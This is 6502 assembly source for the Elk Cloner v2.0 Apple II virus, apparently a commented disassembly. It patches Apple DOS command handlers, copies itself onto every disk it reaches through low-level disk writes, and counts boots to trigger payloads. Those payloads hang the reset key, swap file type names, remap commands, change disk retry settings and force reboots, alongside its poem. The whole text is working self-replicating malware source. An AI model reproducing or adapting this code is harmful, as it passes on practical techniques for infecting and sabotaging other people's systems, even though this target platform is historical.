	ORG $9000

VERSN	DFB $02		; Version 2.0

HIMEM	LDA #$FF	; Put $8FFF at $004C (HIMEM)
	STA $4C
	LDA #$8F
	STA $4D

DOPTCH	LDA #$20	; Patch the DOCMD handler
	STA $A180  	;  with JSR $A75B??
	LDA #$5B 
	STA $A181 
	LDA #$A7 
	STA $A182

RUNPTCH	LDA #$AD	; Patch the RUN command entry point
	STA $A4D1	;  with LDA $AAB6??
	LDA #$B6
	STA $A4D2
	LDA #$AA
	STA $A4D3

LODPTCH	LDA #$4C	; Patch the LOAD command entry point
	STA $A413	;  with JMP LOD
	LDA #>LOD
	STA $A414
	LDA #<LOD
	STA $A415

BLDPTCH	LDA #$4C	; Patch the BLOAD command entry point
	STA $A35D	;  with JMP BLOD
	LDA #>BLOD
	STA $A35E
	LDA #<BLOD
	STA $A35F

CATPTCH	LDA #$4C	; Patch the CATALOG command entry point
	STA $A56E	;  with JMP CATALOG
	LDA #>CATALOG 
	STA $A56F
	LDA #<CATALOG
	STA $A570

USRPTCH	LDA #$4C	; Patch the Applesoft user jump
	STA $0A		;  with JMP USRCMD
	LDA #>USRCMD 
	STA $0B
	LDA #<USRCMD 
	STA $0C

BOOTUP	CLD
	JSR READ	; Read the VTOC

	LDX $B3BF	; Increment boot counter
	INX
	STX $B3BF

	JSR WRITE	; Write the VTOC
	JSR DESTROY	; Execute payload, if necessary
	JMP $A180	; Do command

TESTON	LDA #$00	; Zero FLAG1
	STA FLAG1
	LDA $AA68	; Load current drive
	STA $B7EA	; Set as drive number
	JSR READ	; Read from it
	LDA $B3C2	; Get diskette volume number
	CMP VERSN	; Compare with virus version
	BEQ TESTON1 	; Exit if the same
	LDA #$01	; Otherwise set FLAG1
	STA FLAG1
TESTON1	RTS

LOD	JSR TESTON	; Check if virus present
	LDA FLAG1
	CMP #$00
	BEQ LOD1	; Skip replication, if so
	JSR CLONE	; Replicate the virus
LOD1	JSR $A316	; Execute the rest of the original LOAD command
	JMP $A416

BLOD	JSR TESTON	; Check if virus present
	LDA FLAG1
	CMP #$00
	BEQ BLOD1	; Skip replication, if so
	JSR CLONE	; Replicate the virus
BLOD1	JSR $A2A8	; Execute the rest of the original BLOAD command
	JMP $A360

CATALOG	JSR TESTON	; Check if virus present
	LDA #$06
	JSR $A2AA	; ??
	LDA $B5BF	; Get the volume number from the RWTS parameter block
	STA $AA66	; Set volume number
	LDA FLAG1	; So, was the virus there?
	CMP #$00
	BEQ RETURN	; Skip replication, if not
	JSR CLONE	; Replicate the virus
RETURN	LDA #$0
	STA $B3BE	; Set boot counter to 0
	STA $B3BF	; Set "any volume" to the RWTS parameter block??
	STA $B3C0
	RTS

CLONE	CLC
	JSR READ	; Read VTOC
	LDA IDENT
	STA $B3C0	; Save volume number
	LDA VERSN 
	STA $B3C2	; Save virus version
	JSR WRITE 	; Write it back
	LDA $AA68	; Get drive number
	STA $B7EA	; Store it in the DOS parameter block
	LDA #$02	; Set WRITE command code
	STA $B7F4
	STA $B7EC	; Use Track 02
	LDA #$08	; Use Sector 08
	STA $B7ED
	LDA #$0		; Use any volume
	STA $B7EB
	STA $B7F0	; Use $9500 as I/O buffer
	LDA #$95
	STA $B7F1
CLONE1	LDA #$B7	; Use DOS's own parameter block at $B7E8
	LDY #$E8
	JSR $B7B5	; Call RWTS
	CLD
	BCC CLONE2	; Continue of no error
	RTS		; Abort on error
CLONE2	DEC $B7ED	; Decrement sector number
	DEC $B7F1	; Decrement I/O buffer page
	LDA $B7F1
	CMP #$8F	; Reached bottom yet?
	BNE CLONE1	; Keep looping if not
	LDA #$02	; Use $2000 as I/O buffer
	STA $B7F1
	LDA #$01	; Set READ command code
	STA $B7F4
	STA $B7EC	; Use Track 01
	LDA #$0 
	STA $B7ED	; Use Sector 00
	LDA #$B7	; Use DOS's own parameter block at $B7E8
	LDY #$E8
	JSR $B7B5	; Call RWTS
	CLD
	BCC CLONE3	; Continue of no error
	RTS		; Abort on error
CLONE3	LDA #$4C	; Put a JMP $9B00 at $0280??
	STA $280
	LDA #$00
	STA $281 
	LDA #$9B
	STA $282
	LDA #$02	; Set WRITE command code
	STA $B7F4
	LDA #$B7	; Use DOS's own parameter block at $B7E8
	LDY #$E8
	JSR $B7B5	; Call RWTS
	CLD
	BCC CLONE4	; Continue of no error
	RTS		; Abort on error
CLONE4	LDA #$0		; Set Track 00
	STA $B7EC
	LDA #$A		; Set Sector 0A
	STA $B7ED
	LDA #$95	; Use $9500 as I/O buffer
	STA $B7F1
	LDA #$B7	; Use DOS's own parameter block at $B7E8
	LDY #$E8
	JSR $B7B5	; Call RWTS
	CLD 
	RTS

READ	LDA #$01	; Set READ command code
	STA $B7F4	;  into the DOS command code
	JMP VTOC	; Process the VTOC

WRITE	LDA #$02	; Set WRITE command code
	STA $B7F4	;  into the DOS command code

VTOC	LDA #$11	; Set track number $11
	STA $B7EC
	LDA #$0		; Set sector number $00
	STA $B7ED
	LDA #$BB	; Use $B3BB as I/O buffer
	STA $B7F0
	LDA #$B3
	STA $B7F1
	LDA #$0		; Use any volume number
	STA $B7EB
	LDA #$B7	; Use DOS' own parameter block at $B7E8
	LDY #$E8
	JSR $B7B5	; Call RWTS
	CLD 
	RTS

PRINT	STY $FC		; Use A:Y are base
	STA $FD
	LDY #$00	; Set index to 0
PRINT0	LDA ($FC),Y	; Load character indexed off the base
	CMP #$00	; Eached the end yet?
	BEQ PRINT1	; Exit, if so
	JSR $FDED	; Call COUT1
	INY		; Increment the index
	JMP PRINT0	; Loop
PRINT1	RTS

PRTMSG	LDY #>MSG	; Load MSG address in A:Y
	LDA #<MSG
	JSR PRINT	; Display the message
PRTNUM	LDA IDENT	; Set IDENT as number to print
	STA $44
	JSR $AE42	; Print the 3-digit number in $0044
	LDA #$8D	; Print a CR
	JSR $FDED	; Call COUT1
	RTS

MSG	ASC 'ELK CLONER V2.0 # '
	DFB $0

IDENT	DFB $1

FLAG1	DFB $00

RET	RTS

USRCMD	JSR $E6FB	; Call CONINT
	CPX #$0B	; Is it 11?
	BNE CMD2
	JSR PRTMSG	; If yes, print message and exit
	RTS
CMD2	CPX #$0C	; Is it 12?
	BNE CMD3
	LDY #>REPORT	; If yes, print boot count
	LDA #<REPORT
	JSR PRINT
	JSR READ	; Read the VTOC
	LDA $B3BF	; Get boot counter
	STA $44
	JSR $AE42	; Print 3-digit number
	LDA #$8D	; Print CR
	JSR $FDED	; COUT1
	RTS
CMD3	CPX #$0D 	; Is it 13?
	BNE CMD4
	JSR CLONE	; If yes, replicate
	RTS
CMD4	CPX #$0A	; Is it 10?
	BNE USRERR
	JSR PRPOEM	; If yes, print poem
	RTS
USRERR	LDY #>UERR	; Wrong number, print error message
	LDA #<UERR
	JSR PRINT
	JSR $FBDD	; Ring the bell
	JMP $9DBF	; DOS warmstart

UERR	DFB $8D 
	ASC 'ILLEGAL QUANTITY ERROR'
	DFB $0

PRPOEM	JSR $FC58	; Clear the screen
	LDY #>POEM	; Display the poem
	LDA #<POEM
	JSR PRINT	; Do it
	RTS

REPORT	ASC 'BOOT COUNT: ' 
	DFB $0 

POEM	ASC 'ELK CLONER:'
	DFB $8D,$8D 
	ASC '   THE PROGRAM WITH A PERSONALITY'
	DFB $8D,$8D,$8D 
	ASC 'IT WILL GET ON ALL YOUR DISKS'
	DFB $8D
	ASC 'IT WILL INFILTRATE YOUR CHIPS'
	DFB $8D
	ASC 'YES IT'
	DFB $A7
	ASC 'S CLONER!'
	DFB $8D,$8D
	ASC 'IT WILL STICK TO YOU LIKE GLUE'
	DFB $8D
	ASC 'IT WILL MODIFY RAM TOO'
	DFB $8D
	ASC 'SEND IN THE CLONER!'
	DFB $8D,$8D,$8D,$8D,$0

IOERR	LDY #>ERRMSG	; Display ERRMSG
	LDA #<ERRMSG
	JSR PRINT	; Do it
	JSR $FBDD	; Ring the bell
	JMP $9DBF	; Warmstart

ERRMSG	DFB $8D,$8D 
	ASC 'I/O ERROR'
	DFB $8D,$00

DESTROY	LDA $B3BF	; Check the virus boot counter
	CMP #10		; Is it 10?
	BNE DEST1	; Next check, if not
	LDA #$69	; Make reset transfer control to $FF69 (monitor)
	STA $3F2
	LDA #$FF 
	STA $3F3
	JSR $FB6F	; Call SETPWRC
	RTS
DEST1	CMP #15		; Is it 15?
	BNE DEST2	; Next check, if not
	LDA #$3F	; Set video mode to inverse
	STA $32
	RTS
DEST2	CMP #20		; Is it 20?
	BNE DEST3	; Next check, if not
	LDA $C030	; Toggle speaker ("blip")
	LDA $C030
	LDA $C030
	RTS
DEST3	CMP #25		; Is it 25?
	BNE DEST4	; Next check, if not
	LDA #$7F	; Set video mode to flashing
	STA $32
	RTS
DEST4	CMP #30		; Is it 30?
	BNE DEST5	; Next check, if not
	LDA #'I'	; Swap file type names: I<->T, A<->B
	STA $B3A7
	LDA #'T'
	STA $B3A8
	LDA #'B'
	STA $B3A9
	LDA #'A'
	STA $B3AA 
	RTS
DEST5	CMP #35		; Is it 35?
	BNE DEST6	; Next check, if not
	LDA #$85	; Set the command character from Ctrl-D to Ctrl-E
	STA $AAB2
	RTS
DEST6	CMP #40		; Is it 40?
	BNE DEST7	; Next check, if not
	LDA #$00	; Set the reset transfer control to $0300
	STA $3F2
	LDA #$03
	STA $3F3
	JSR $FB6F	; Call SETPWRC
	LDA #$4C	; Put a JMP $0300 at $0300 (make reset hang)
	STA $300
	LDA #$00
	STA $301
	LDA #$03
	STA $302
	RTS
DEST7	CMP #45		; Is it 45?
	BNE DEST8	; Next check, if not
	LDA #$80	; Make all commands act as RUN
	STA $D6
	RTS
DEST8	CMP #50		; Is it 50?
	BNE DEST9	; Next check, if not
	LDA #>PRPOEM	; Make reset transfer control to the poem display routine
	STA $3F2
	LDA #<PRPOEM
	STA $3F3
	JSR $FB6F	; Call SETPWRC
	RTS
DEST9	CMP #55		; Is it 55?
	BNE DEST10	; Next check, if not
	LDA #$FF	; Set number of retries to 255??
	STA $BDD3
	RTS
DEST10	CMP #60		; Is it 60
	BNE DEST11	; Next check, if not
	LDA #$20	; Set number of retries to 32??
	STA $BDD3
	RTS
DEST11	CMP #65		; Is it 65?
	BNE DEST12	; Next check, if not
	LDA #$4C	; Set DOCMD to JMP MONZ
	STA $A180
	LDA #$69
	STA $A181
	LDA #$FF
	STA $A182
	RTS
DEST12	CMP #70		; Is it 70?
	BNE DEST13	; Next check, if not
	LDA #$10	; Set number of retries to 16??
	STA $BDD3
	RTS
DEST13	CMP #75		; Is it 75?
	BNE DEST14	; Next check, if not
	JMP $C600	; Reboot (IN#6)
DEST14	CMP #76		; Is it 76?
	BNE DEST15	; Next check, if not
	JMP $C600	; Reboot (IN#6)
DEST15	CMP #77		; Is it 77?
	BNE DEST16	; Next check, if not
	JMP $C600	; Reboot (IN#6)
DEST16	CMP #78		; Is it 78?
	BNE DEST17	; Next check, if not
	JMP $C600	; Reboot (IN#6)
DEST17	CMP #79		; Is it 79?
	BNE DEST18	; Exit, if not
	JSR READ	; Read VTOC
	LDA #$00	; Zero the virus boot counter
	STA $B3BF
	JSR WRITE	; Write it back
	RTS
DEST18	RTS

LOADER	ORG $9500
	LDA #$02	; Set Track 02
	STA $B7EC
	LDA #$01	; Set READ command code
	STA $B7F4 
	LDA #$03	; Set Sector 03
	STA $B7ED
	LDA #$0		; Set any volume number
	STA $B7EB
	STA $B7F0	; Use $9000 as data buffer
	LDA #$90
	STA $B7F1
LOAD1	LDA #$B7	; Use the DOS' own RWTS parameter block at $B7E8
	LDY #$E8
	JSR $B7B5	; Call RWTS
	INC $B7ED	; Increment sector number
	INC $B7F1	; Increment I/O buffer high byte
	LDA $B7F1	; Reached $9600 already?
	CMP #$96
	BCC LOAD1	; Loop if not
	JMP HIMEM 	; Otherwise transfer control to the virus that was read
